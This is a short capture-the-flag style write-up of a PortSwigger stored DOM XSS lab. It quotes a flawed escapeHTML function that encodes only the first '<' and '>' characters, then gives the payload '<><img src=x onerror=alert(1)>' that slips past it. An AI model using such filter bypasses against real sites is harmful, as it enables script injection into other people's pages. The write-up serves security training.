Link: [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
Difficulty: Practitioner

# Action 
In the Page Source, the site use a script called `loadCommentsWithVulnerableEscapeHtml.js`, and spot this function
```
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

So whenever user input any brackets `<` or `>`, they would be encoded with that function. 
<img width="790" height="122" alt="Screenshot 2026-10-05 at 4 50 56 pm" src="https://github.com/user-attachments/assets/5746f87f-e07e-4339-9a1a-e61abefb00c3" />

The payload was 
```
<><img src=x>
```

So to trigger XSS, I just need to add `onerror=alert(1)`, finally the payload would look like this
```
<><img src=x onerror=alert(1)>
```
The reason why XSS exists was the function `escapeHTML` use `replace()` function which only replace on set of `<>` and does not affect the second set.

Happy Hacking@#!#!
